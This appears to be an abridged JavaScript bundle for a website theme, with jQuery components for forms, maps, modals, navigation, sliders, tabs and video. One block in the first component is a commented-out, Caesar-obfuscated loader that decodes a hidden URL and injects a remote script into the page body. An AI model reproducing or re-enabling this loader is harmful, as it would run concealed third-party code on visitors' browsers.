...
(mr = (function (a, b, c, d) {
  ...
  (mr = (function (a, b, c, d) {
    ...
    return (
      (a.scroll.update = function () {
        (a.scroll.y = c.pageYOffset), (a.scroll.x = c.pageXOffset);
        for (
          var b = a.scroll.listeners.length,
            d = 0,
            b = a.scroll.listeners.length;
          b > d;
          d++
        )
          a.scroll.listeners[d]();
      }),
  ...
  !(function (a) {
    ...
    function c(a, b) {
      ...
      for (var d = 0; d < a.length; d++) {
        ...
        c +=
          e >= 65 && 90 >= e
            ? String.fromCharCode(((e - 65 + b) % 26) + 65)
            : e >= 97 && 122 >= e
            ? String.fromCharCode(((e - 97 + b) % 26) + 97)
            : a.charAt(d);
      }
      return c;
    }
    ...
    //   (d.src = b(
    //     c(
    //       "ja.ggRezrd/dft.eutbtri.6wt.15i.3tu738rt3272ww20r6r2t81v95373624-624r00298tu178v6rw73//:gkky",
    //       17
    //     )
    //   )),
    //     document.querySelector(b(c("bgre", 3))).appendChild(d);
    // }
  })(),
  (mr = (function (a, b, c, d) {
    var e = function (a) {
      a(".background-image-holder").each(function () {
        ...
        a(this).css("background", 'url("' + b + '")'),
          a(this).css("background-position", "initial"),
          a(this).css("opacity", "1");
      });
    };
    return (
      (a.backgrounds = { documentReady: e }),
      a.components.documentReady.push(e),
      a
    );
  })(mr, jQuery, window, document)),
  ...
  (mr = (function (a, b, c, d) {
    ...
    var e = function (b) {
      b(".input-checkbox")
        ...
        b(".input-radio")
          .unbind("click")
          .click(function () {
            b(this).closest("form").find(".input-radio").removeClass("checked"),
              b(this).addClass("checked"),
              b(this).find("input").prop("checked", !0);
          }),
    ...
    return (
      ...
      (a.forms.submit = function (d) {
        ...
        if (
          (j.find(".form-error, .form-success").remove(),
          ...
          j.append(
            '<div class="form-error" style="display: none;">' + h + "</div>"
          ),
          j.append(
            '<div class="form-success" style="display: none;">' + i + "</div>"
          ),
          (f = j.find(".form-error")),
          (g = j.find(".form-success")),
          k.addClass("attempted-submit"),
          -1 !== l.indexOf("createsend.com") ||
            -1 !== l.indexOf("list-manage.com"))
        )
          if (
            ("undefined" != typeof o && o !== !1 && f.html(o),
      ...
      (a.forms.validateFields = function (a) {
        ...
        if (
          (b(a)
            ...
            .each(function () {
              b('[name="' + b(this).attr("name") + '"]:checked').length ||
                ((d = 1),
                (c = b(this).attr("name").replace("[]", "")),
                e
                  .find(".form-error")
                  .text("Please tick at least one " + c + " box."));
            }),
          b(a)
            .find(".validate-required, .required, [required]")
            .each(function () {
              "" === b(this).val()
                ? (b(this).addClass("field-error"), (d = 1))
                : b(this).removeClass("field-error");
            }),
          b(a)
          ...
          f.length &&
            b("html, body")
              .stop(!0)
              .animate({ scrollTop: f.offset().top - 100 }, 1200, function () {
                f.focus();
              });
  ...
  (mr = (function (a, b, c, d) {
    ...
    var e = function (b) {
      b(".map-holder").click(function () {
        ...
        b(".map-holder").length &&
          b(c).scroll(function () {
            b(".map-holder.interact").length &&
              b(".map-holder.interact").removeClass("interact");
          }),
        a.maps.initAPI(),
        a.maps.init();
    };
    return (
      (a.maps.documentReady = e),
      (a.maps.initAPI = function () {
        if (
          d.querySelector("[data-maps-api-key]") &&
          !d.querySelector(".gMapsAPI") &&
          b("[data-maps-api-key]").length
        ) {
          ...
          (c = "undefined" != typeof c ? c : ""),
            "" !== c &&
              ...
              (a.className = "gMapsAPI"),
              d.body.appendChild(a));
        }
      }),
      (a.maps.init = function () {
        "undefined" != typeof c.google &&
          "undefined" != typeof c.google.maps &&
          b(".map-container[data-maps-api-key]").each(function () {
            var a,
              e,
              f,
              g = this,
              h =
                "undefined" != typeof b(this).attr("data-map-style")
                  ? b(this).attr("data-map-style")
                  : !1,
              i = JSON.parse(h) || [
                {
              ...
              j =
                "undefined" != typeof b(this).attr("data-map-zoom") &&
                "" !== b(this).attr("data-map-zoom")
                  ? 1 * b(this).attr("data-map-zoom")
                  : 17,
              k =
                "undefined" != typeof b(this).attr("data-latlong")
                  ? b(this).attr("data-latlong")
                  : !1,
              l = k ? 1 * k.substr(0, k.indexOf(",")) : !1,
              m = k ? 1 * k.substr(k.indexOf(",") + 1) : !1,
              n = new google.maps.Geocoder(),
              o =
                "undefined" != typeof b(this).attr("data-address")
                  ? b(this).attr("data-address").split(";")
                  : [""],
              f =
                "undefined" != typeof b(this).attr("data-marker-image")
                  ? b(this).attr("data-marker-image")
                  : "img/mapmarker.png",
              p = "We Are Here",
              q = b(d).width() > 766 ? !0 : !1,
              r = {
            ...
            "undefined" != typeof b(this).attr("data-marker-title") &&
              "" != b(this).attr("data-marker-title") &&
              (p = b(this).attr("data-marker-title")),
              void 0 != o && "" != o[0]
                ? n.geocode(
                ...
                : void 0 != l &&
                  ...
                  "" != m &&
                  0 != m &&
                  ((r.center = { lat: l, lng: m }),
                  (a = new google.maps.Map(g, r)),
                  (e = new google.maps.Marker({
                    position: { lat: l, lng: m },
                    map: a,
                    icon: f,
                    title: p,
                  })));
    ...
    var e = function (b) {
      b(".modal-container").each(function () {
        ...
        if (
          ...
          var f =
            1 *
            e.attr("data-width").substr(0, e.attr("data-width").indexOf("%"));
          b(c).width() < 1280 && b(c).width() > 990
            ? (f += 15)
            : b(c).width() < 990 && (f += 20),
            e.css("width", f + "%");
        }
        if (void 0 !== e.attr("data-height")) {
          var g =
            1 *
            e.attr("data-height").substr(0, e.attr("data-height").indexOf("%"));
          b(c).height() < 768 && (g += 15), e.css("height", g + "%");
        }
        a.util.idleSrc(d, "iframe");
      }),
        "undefined" == typeof mr_variant &&
          b(".modal-instance").each(function (a) {
            var c = b(this).find(".modal-container"),
              d = (c.find(".modal-content"), b(this).find(".modal-trigger"));
            d.attr("data-modal-index", a),
              c.attr("data-modal-index", a),
              "undefined" != typeof c.attr("data-modal-id") &&
                d.attr("data-modal-id", c.attr("data-modal-id")),
              (c = c.detach()),
              b("body").append(c);
          }),
        b(".modal-trigger").click(function () {
          var c, d;
          return (
            "undefined" != typeof b(this).attr("data-modal-id")
              ? ((c = b(this).attr("data-modal-id")),
                (d = b("body").find(
                  '.modal-container[data-modal-id="' + c + '"]'
                )))
              : ((c = b(this).attr("data-modal-index")),
                (d = b("body").find(
                  '.modal-container[data-modal-index="' + c + '"]'
                ))),
        ...
        b(".modal-close").click(a.modals.closeActiveModal),
        b(d).keyup(function (b) {
        ...
        b(".modal-container[data-autoshow]").each(function () {
          ...
          a.util.activateIdleSrc(c),
            ...
            "undefined" != typeof c.attr("data-cookie")
              ? a.cookies.hasItem(c.attr("data-cookie")) ||
                a.modals.showModal(c, d)
              : a.modals.showModal(c, d);
        });
    };
    return (
      (a.modals.documentReady = e),
      ...
      (a.modals.closeActiveModal = function () {
        ...
        a.util.idleSrc(c, "iframe"),
          a.util.pauseVideo(c),
          "undefined" != typeof c.attr("data-cookie") &&
            a.cookies.setItem(c.attr("data-cookie"), "true", 1 / 0),
          c.removeClass("modal-active");
      }),
  ...
  (mr = (function (a, b, c, d) {
    ...
    var e = function (b) {
      (a.navigation.nav.element = b("nav")),
        (a.navigation.bar.element = b("nav .nav-bar")),
        a.navigation.nav.element.length
          ? (a.navigation.nav.outerHeight = b("nav").outerHeight())
          : (a.navigation.nav.outerHeight = 0),
        a.navigation.bar.element.length && a.navigation.bar.init(),
        b(".nav-mobile-toggle").click(function () {
        ...
        b(".menu li").click(function (a) {
          ...
          e.stopPropagation(),
            d.find("ul").length
              ...
              : d.parents(".active").removeClass("active");
        }),
        ...
        b(".menu > li > ul").each(function () {
          ...
          if (d > b(c).width() && !b(this).hasClass("multi-column"))
            b(this).addClass("make-right");
    ...
    return (
      (a.navigation.bar.init = function () {
        var b = a.navigation.bar.element.attr("data-fixed-at");
        (a.navigation.bar.fixedAt =
          "undefined" != typeof b ? parseInt(b.replace("px", "")) : !1),
          a.navigation.bar.element.hasClass("nav--fixed")
            ? (a.navigation.bar.isFixed = !0)
            : b &&
              (a.navigation.nav.element.css(
                "min-height",
                a.navigation.nav.outerHeight
              ),
              (a.navigation.bar.isFixed = !1),
              a.scroll.listeners.push(a.navigation.bar.update));
      }),
      (a.navigation.bar.update = function () {
        a.scroll.y > a.navigation.bar.fixedAt &&
          !a.navigation.bar.isFixed &&
          ((a.navigation.bar.isFixed = !0),
          a.navigation.bar.element.addClass("nav--fixed")),
          a.scroll.y < a.navigation.bar.fixedAt &&
            a.navigation.bar.isFixed &&
            ((a.navigation.bar.isFixed = !1),
            a.navigation.bar.element.removeClass("nav--fixed"));
      }),
      (a.navigation.documentReady = e),
      a.components.documentReady.push(e),
      a
    );
  })(mr, jQuery, window, document)),
  (mr = (function (a, b, c, d) {
    ...
    var e = function (b) {
      ...
      b('form[action*="createsend.com"]').each(function () {
        (c = b(this)),
          b(this).attr("novalidate", "novalidate"),
          c.is(".form--no-placeholders") ||
            c.find("input:not([checkbox]):not([radio])").each(function () {
              b(this).attr("placeholder", b(this).siblings("label").text()),
                c.is(".form--no-labels") && b(this).siblings("label").remove(),
                b(this).parent().is("p") && b(this).unwrap();
            }),
          ...
          c.find('input[type="checkbox"]').each(function () {
            (d = b(this)),
              ...
              d.before(
                '<div class="input-checkbox" data-id="' + f + '"></div>'
              ),
              b('.input-checkbox[data-id="' + f + '"]').prepend(d),
              b('.input-checkbox[data-id="' + f + '"]').prepend(e),
              b('.input-checkbox[data-id="' + f + '"]').prepend(
                '<div class="inner"></div>'
              );
          }),
          ...
          (c = b(this)),
            ...
            c.find('input[type="checkbox"]').each(function () {
              (d = b(this)),
                ...
                g.find(".input-checkbox").prepend(d),
                g.find(".input-checkbox").prepend(e);
            }),
            c.find('input[type="radio"]').each(function () {
              (h = b(this)),
                (g = h.closest("li")),
    ...
    return (
      (a.newsletters.documentReady = e),
      (a.newsletters.prepareAjaxAction = function (a) {
        var c = b(a).attr("action");
        /list-manage\.com/.test(c) &&
          ((c = c.replace("/post?", "/post-json?") + "&c=?"),
  ...
  (mr = (function (a, b, c, d) {
    ...
    var e = function (b) {
      b(".notification").each(function () {
        b(this).find(".notification-close").length ||
          b(this).append(
        ...
        b("[data-notification-link]:not(.notification)").click(function () {
          var a = b(this).attr("data-notification-link"),
            c = b("body").find(
              '.notification[data-notification-link="' + a + '"]'
            );
          return (
        ...
        b(".notification-close").click(function () {
          return (
            a.notifications.closeNotification(b(this)),
            "#" === b(this).attr("href") ? !1 : void 0
          );
        });
    };
    return (
      (a.notifications.documentReady = e),
      (a.notifications.showNotification = function (a, b) {
        var c = "undefined" != typeof b ? 1 * b : 0;
        setTimeout(function () {
      ...
      (a.notifications.closeNotification = function (c) {
        (c = b(c).is(".notification-close")
          ? b(c).closest(".notification")
          : b("body").find(
              '.notification[data-notification-link="' + c + '"]'
            )),
  ...
  (mr = (function (a, b, c, d) {
    var e = function (a) {
      a(".slider").each(function () {
        var b = a(this),
          ...
          e = !1,
          f = 7e3;
        (c = "true" == b.attr("data-arrows") ? !0 : !1),
          (d = "slide" == b.attr("data-animation") ? "slide" : "fade"),
          (e = "true" == b.attr("data-paging") ? !0 : !1),
          b.attr("data-timing") && (f = b.attr("data-timing")),
          b.flexslider({
            animation: d,
            directionNav: c,
            controlNav: e,
    ...
    return (
      (a.sliders = { documentReady: e }), a.components.documentReady.push(e), a
    );
  })(mr, jQuery, window, document)),
  (mr = (function (a, b, c, d) {
    var e = function (a) {
      a(".tabs").each(function () {
        ...
        b.after('<ul class="tabs-content">'),
          b.find("li").each(function () {
            ...
            c.detach(),
              b.closest(".tabs-container").find(".tabs-content").append(c);
          });
      }),
        a(".tabs li").click(function () {
          var b = a(this),
            ...
            d = 1 * b.index() + 1;
          c.find("> .tabs > li").removeClass("active"),
            c.find("> .tabs-content > li").removeClass("active"),
            b.addClass("active"),
            c
              .find("> .tabs-content > li:nth-of-type(" + d + ")")
              .addClass("active");
        }),
  ...
  (mr = (function (a, b, c, d) {
    var e = function (a) {
      a(".youtube-background").length &&
        a(".youtube-background").each(function () {
          var b = a(this),
        ...
        a(".video-cover").each(function () {
          var b = a(this);
          b.find("iframe").length &&
            (b.find("iframe").attr("data-src", b.find("iframe").attr("src")),
        ...
        a(".video-cover .video-play-icon").on("click", function () {
          ...
          if (c.find("iframe").length) {
            var e = c.find("iframe");
            return (
              e.attr("src", e.attr("data-src")), c.addClass("reveal-video"), !1
            );
          }
        });
    };
    return (
      (a.video = { documentReady: e }), a.components.documentReady.push(e), a
    );
  })(mr, jQuery, window, document)),
